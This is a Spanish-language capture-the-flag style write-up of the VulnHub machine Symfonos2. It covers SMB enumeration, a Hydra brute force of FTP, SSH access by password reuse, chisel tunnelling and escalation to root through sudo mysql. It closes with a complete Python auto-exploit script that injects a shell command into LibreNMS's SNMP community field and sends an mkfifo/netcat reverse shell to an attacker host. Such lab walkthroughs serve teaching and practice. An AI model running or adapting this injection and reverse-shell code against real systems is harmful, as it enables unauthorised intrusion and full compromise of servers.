---
layout: single
title: Symfonos2 - VulnHub
excerpt: "Symfonos2 es una máquina vulnerable de la plataforma vulnhub.Que se centra en un servicio SAMBA que filtra información de un usuario del sistema, por lo que se procede a inicializar fuerza bruta, ya que el usuario contiene credenciales débiles. Seguido de una escalada de privilegios de 2 fases, La primera es dirigida a cronos que tiene inicializado un servicio web corriendo \"librenms\" que es vulnerable a ejecución de código. La segunda fase es al usuario root desde el usuario cronos que posee privilegios para ejecutar mysql como \"root\"."
date: 2023-11-02
classes: wide
header:
  teaser: /assets/images/vulnhub-writeup-pinkys/logo_vulnhub.png
  teaser_home_page: true
categories:
  - vulnhub 
  - cxdxnt
tags:  
  - suid
  - rpcbind
  - mount
---
![](/assets/images/vulnhub-writeup-pinkys/logo_vulnhub.png)


Symfonos2 es una máquina vulnerable de la plataforma vulnhub. Que se centra en un servicio SAMBA que filtra información de un usuario del sistema, por lo que se procede a inicializar fuerza bruta, ya que el usuario contiene credenciales débiles. Seguido de una escalada de privilegios de2 fases, La primera es dirigida a cronos que tiene inicializado un servicio web corriendo "librenms" que es vulnerable a ejecución de código. La segunda fase es al usuario root desde el usuario cronos que posee privilegios para ejecutar mysql como "root".

## Enumeración

Empezamos con un reconocimiento de puertos y servicios a través de la herramienta nmap. En el cual logramos detectar varios servicios.

```bash
# Nmap 7.93 scan initiated Mon Oct 30 12:06:23 2023 as: nmap -sCV -p21,22,80,139,445 -oN vulnscan.nmap 192.168.56.14
Nmap scan report for 192.168.56.14
Host is up (0.00029s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         ProFTPD 1.3.5
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 9df85f8720e58cfa68477d716208adb9 (RSA)
|   256 042abb0656ead1931cd2780a00469d85 (ECDSA)
|_  256 28adacdc7e2a1cf64c6b47f2d6225b52 (ED25519)
80/tcp  open  http        WebFS httpd 1.21
|_http-server-header: webfs/1.21
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
MAC Address: 08:00:27:9F:02:FC (Oracle VirtualBox virtual NIC)
Service Info: Host: SYMFONOS2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1h20m01s, deviation: 2h53m12s, median: -3h00m01s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: SYMFONOS2, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-10-30T12:06:34
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos2
|   NetBIOS computer name: SYMFONOS2\x00
|   Domain name: \x00
|   FQDN: symfonos2
|_  System time: 2023-10-30T07:06:34-05:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Oct 30 12:06:36 2023 -- 1 IP address (1 host up) scanned in 12.62 seconds
```


## Analisis 

Inicializamos la enumeración por el servicio SAMBA y notamos que solamente tenemos acceso como usuario nulo al directorio anonymous.

```bash
➜  content smbmap -H 192.168.56.14 -u null                   
[+] Guest session   	IP: 192.168.56.14:445	Name: 192.168.56.14                                     
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	anonymous                                         	READ ONLY	
	IPC$                                              	NO ACCESS	IPC Service (Samba 4.5.16-Debian)
```

Al momento de conectarnos, descargamos el único archivo que se nos presenta.

```bash
➜  content smbmap -H 192.168.56.14 -u null                   
[+] Guest session   	IP: 192.168.56.14:445	Name: 192.168.56.14                                     
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	anonymous                                         	READ ONLY	
	IPC$                                              	NO ACCESS	IPC Service (Samba 4.5.16-Debian)
➜  content smbclient //192.168.56.14/anonymous -U "null%null"
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jul 18 11:30:09 2019
  ..                                  D        0  Tue Oct 31 02:23:05 2023
  backups                             D        0  Thu Jul 18 11:25:17 2019

		19728000 blocks of size 1024. 16296316 blocks available
smb: \> mget backups\log.txt 
Get file log.txt? y
Error opening local file backups/log.txt
smb: \> exit
```
En el archivlo log.txt nos brindan un usuario de sistema por lo que procedemos a ejercer fuerza bruta para conectarnos al servicio FTP, luego probamos si las credenciales se reutilizan para el servicio SSH.

```bash
➜  content hydra -l aeolus -P /usr/share/wordlists/rockyou.txt ftp://192.168.56.14 -t 64
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-31 07:47:35
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ftp://192.168.56.14:21/
[STATUS] 7343.00 tries/min, 7343 tries in 00:01h, 14337185 to do in 32:33h, 64 active
[STATUS] 7310.67 tries/min, 21932 tries in 00:03h, 14322596 to do in 32:40h, 64 active
[21][ftp] host: 192.168.56.14   login: aeolus   password: sergioteamo
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 35 final worker threads did not complete until end.
[ERROR] 35 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-10-31 07:51:03
```


Las contraseñas se reutilizan.


```bash
➜  content sshpass -p 'sergioteamo' ssh aeolus@192.168.56.14 
Linux symfonos2 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Oct 31 00:53:08 2023 from 192.168.56.1
aeolus@symfonos2:~$ whoami
aeolus
```

Al momento de ingresar en el sistema, listamos los puertos y vemos lo siguiente.

![](/assets/images/vulnhub-writeup-symfonos2/symfonos2puertos.png)

 Procedemos a descargarnos la herramienta "chisel" y trasladarla a la máquina víctima, para tener el puerto 8080 en nuestra máquina.
```bash
#wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz

#client 
./chisel client 192.168.56.1:8001 R:8080:127.0.0.1:8080

# Server
chisel server -p 8001 -reverse 
```

## Shell - Cronos 

Ingresamos al servicio web, y vemos que esta utilizando "libresnms". El servicio "librenms" contiene credenciales re utilizables del usuario aeolus, por lo que nos conectamos.



![](/assets/images/vulnhub-writeup-symfonos2/librenmssymfonos2.png)

Buscamos exploit de "librenms" y utilizamos el primero que encontramos.

![](/assets/images/vulnhub-writeup-symfonos1/symfonos2-sesion.png)


Iniciada sesión como cronos ejecutamos el comando sudo -l 


```bash
cronus@symfonos2:/opt/librenms/html$ sudo -l
sudo -l
Matching Defaults entries for cronus on symfonos2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cronus may run the following commands on symfonos2:
    (root) NOPASSWD: /usr/bin/mysql
```
Nos dirigimos a gtfbins para informarnos si hay alguna vía de elevar privilegios a root a través del programa MYSQL.

![](/assets/images/vulnhub-writeup-symfonos2/gtfbins.png)


## Shell - root :)

![](/assets/images/vulnhub-writeup-symfonos2/root.png)


## Auto Pwned

He creado un script en python3 que nos permite ingresar a la máquina según el usuario que elijamos. Para aclarar tenemos que tener acceso al puerto 8080 para que se pueda ejecutar correctamente.


```python
import requests,re,argparse,random,socket,threading
from urllib.parse import urlencode 

def data():
    parser = argparse.ArgumentParser(description='Auto Pwned Symfonos-2')
    parser.add_argument('-t','--target', required=True, help='Target Ip vict')
    parser.add_argument('-ul','--userLogin',required=True,help='User login')
    parser.add_argument('-p','--password',required=True,help='Password Login')
    parser.add_argument('-u','--user', required=True, help='Users (cronos,root)')
    parser.add_argument('-lp','--lport',required=True, help="Port attack")
    parser.add_argument('-lh','--lhost',required=True,help="Ip attack")
    args = parser.parse_args()
    url = args.target
    user_login=args.userLogin
    password=args.password
    user_system = args.user 
    lport = args.lport
    lhost = args.lhost 
    return url,user_login,password,user_system,lport,lhost 

def login(url,user_login,password,user_system,lport,lhost):
    session = requests.Session()
    url_login = url+"/login"
    token_data =  session.get(url_login).text
    token = re.findall(r'<meta name="csrf-token" content="(.*?)">',token_data)[0]
    # _token=GcWVbbJVnWKUO36bRZbsb0kkuxjB4IWCirREZDkc&username=aeolus&password=sergioteamo&submit=
    data_post={
        "_token":token,
        "username":user_login,
        "password":password,
        "submit":""
    }
    response = session.post(url_login,data_post)
    login_check = url + "/device-groups/"
    check = requests.get(login_check)
    if check.status_code == 200:
        print("[+]Successful login")
    else:
        print("[-]Error login")
    return session

def user_cronos(url,lport,lhost,session):
    print("[+] Starting attack on cronos")
    cmd= "'$(nc -lvnp 4442 -e /bin/bash &) #"
    headers = {
        "User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Content-Type":"application/x-www-form-urlencoded"
    }
    hostname = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(7))
    data_post = {
        "hostname": hostname,
        "snmp": "on",
        "sysName": "",
        "hardware": "",
        "os": "",
        "snmpver": "v2c",
        "os_id": "",
        "port": "",
        "transport": "udp",
        "port_assoc_mode": "ifIndex",
        "community": cmd,
        "authlevel": "noAuthNoPriv",
        "authname": "",
        "authpass": "",
        "cryptopass": "",
        "authalgo": "MD5",
        "cryptoalgo": "AES",
        "force_add": "on",
        "Submit": ""
    }
    url_addhost = url+"/addhost/"
    data_urlencode = urlencode(data_post)
    try:
        response_addhost = session.post(url_addhost,data_urlencode,headers=headers,timeout=5).text
        if "Device added" in response_addhost:
            print("[+]Add device successful")
            data_exploit = {
                "id":"capture",
                "format":"text",
                "type":"snmpwalk",
                "hostname":hostname
                        }
            url_exploit = session.get(url=url+"/ajax_output.php",params=data_exploit,headers=headers,timeout=5)
            pass
        else:
            print("[-] Add device error")
    except:
        pass
    ########################################################################################################
    command_two="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc %s %s >/tmp/f\n"%(lhost,lport)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.56.14", 4442))  # Cambia la dirección y el puerto según tus necesidades
    s.send(command_two.encode())
def user_root(url,lport,lhost,session):
    print("[+] Starting attack on root")
    cmd= "'$(nc -lvnp 4441 -e /bin/bash &) #"
    headers = {
        "User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Content-Type":"application/x-www-form-urlencoded"
    }
    hostname = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(7))
    data_post = {
        "hostname": hostname,
        "snmp": "on",
        "sysName": "",
        "hardware": "",
        "os": "",
        "snmpver": "v2c",
        "os_id": "",
        "port": "",
        "transport": "udp",
        "port_assoc_mode": "ifIndex",
        "community": cmd,
        "authlevel": "noAuthNoPriv",
        "authname": "",
        "authpass": "",
        "cryptopass": "",
        "authalgo": "MD5",
        "cryptoalgo": "AES",
        "force_add": "on",
        "Submit": ""
    }
    url_addhost = url+"/addhost/"
    data_urlencode = urlencode(data_post)
    try:
        response_addhost = session.post(url_addhost,data_urlencode,headers=headers,timeout=5).text
        if "Device added" in response_addhost:
            print("[+]Add device successful")
            data_exploit = {
                "id":"capture",
                "format":"text",
                "type":"snmpwalk",
                "hostname":hostname
                        }
            url_exploit = session.get(url=url+"/ajax_output.php",params=data_exploit,headers=headers,timeout=5)
            pass
        else:
            print("[-] Add device error")
    except:
        pass
    ########################################################################################################
    command=b"sudo mysql -e '\! /bin/sh'\n"
    command_two="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc %s %s >/tmp/f\n"%(lhost,lport)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.56.14", 4441))  # Cambia la dirección y el puerto según tus necesidades
    s.send(command)
    s.send(command_two.encode())
if __name__ == "__main__":
    proxies = {"http":"http://127.0.0.1:8083"}
    url,user_login,password,user_system,lport,lhost = data()
    session = login(url,user_login,password,user_system,lport,lhost)
    if user_system == "cronos":
        user_cronos(url,lport,lhost,session)
    else:
        pass
    if user_system == "root":
        user_root(url,lport,lhost,session)
    else:
        pass
```
